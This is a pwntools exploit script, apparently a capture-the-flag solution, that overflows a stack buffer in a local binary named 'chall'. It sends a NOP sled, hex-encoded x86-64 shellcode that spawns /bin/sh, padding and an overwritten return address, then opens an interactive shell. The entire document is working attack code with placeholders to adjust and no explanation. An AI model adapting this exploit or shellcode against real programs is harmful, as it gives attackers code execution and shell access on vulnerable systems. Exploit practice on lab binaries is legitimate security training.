from pwn import *

# Set context for the binary
context.binary = './chall'

# Start the process (or connect to remote)
p = process('./chall')

# Shellcode (replace with your own if needed)
shellcode = b"\x48\x31\xc0\x48\x31\xd2\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x51\x48\x89\xe7\xb9\x2e\x2f\x00\x00\x51\x48\x89\xe6\x50\x56\x57\x48\x89\xe6\xb8\x3b\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\x0f\x05"

# Calculate the required buffer size
buffer_size = 100  # Adjust this based on the actual buffer size
nop_sled = b"\x90" * (buffer_size - len(shellcode) - 8)  # Adjust to fit the buffer
ret_address = p64(0x00005555555551b4)  # Replace with the correct return address

# Construct the payload
payload = nop_sled + shellcode + b"A" * 8 + ret_address

# Send the payload
p.sendline(payload)

# Interact with the shell if it gets executed
p.interactive()
